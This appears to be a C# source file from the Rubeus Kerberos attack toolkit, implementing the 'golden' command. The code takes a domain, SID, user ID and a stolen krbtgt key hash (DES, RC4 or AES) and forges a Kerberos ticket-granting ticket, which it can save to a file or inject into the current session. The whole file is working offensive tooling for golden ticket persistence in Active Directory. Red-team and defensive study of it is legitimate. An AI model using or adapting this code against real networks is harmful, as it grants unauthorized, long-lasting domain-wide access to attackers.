using System;
using System.Collections.Generic;

namespace Rubeus.Commands
{
    public class Golden : ICommand
    {
        public static string CommandName => "golden";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Build TGT\r\n");

            string user = "";
            string domain = "";
            string hash = "";
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
            string outfile = "";
            bool ptt = false;
            string sid = "";
            int uid = 500;
            bool fromldap = false;
            string dc = "";

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/sid"))
            {
                sid = arguments["/sid"];
            }
            if (arguments.ContainsKey("/fromldap"))
            {
                fromldap = true;
            }
            if (arguments.ContainsKey("/uid"))
            {
                uid = Int32.Parse(arguments["/uid"]);
            }
            if (String.IsNullOrEmpty(domain))
            {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }

            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey("/enctype"))
            {
                string encTypeString = arguments["/enctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
                {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals("AES128"))
                {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("DES"))
                {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            if (arguments.ContainsKey("/des"))
            {
                hash = arguments["/des"];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/ntlm"))
            {
                hash = arguments["/ntlm"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/aes128"))
            {
                hash = arguments["/aes128"];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }

            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(hash))
            {
                Console.WriteLine("\r\n[X] You must supply a [/des|/rc4|/aes128|/aes256] hash!\r\n");
                return;
            }

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine("\r\n[X] Only /des, /rc4, /aes128, and /aes256 are supported at this time.\r\n");
                return;
            }
            else
            {
                ForgeTickets.ForgeTicket(user, String.Format("krbtgt/{0}", domain), hash, encType, fromldap, sid, domain, dc, uid, outfile, ptt);
                return;
            }
        }
    }
}
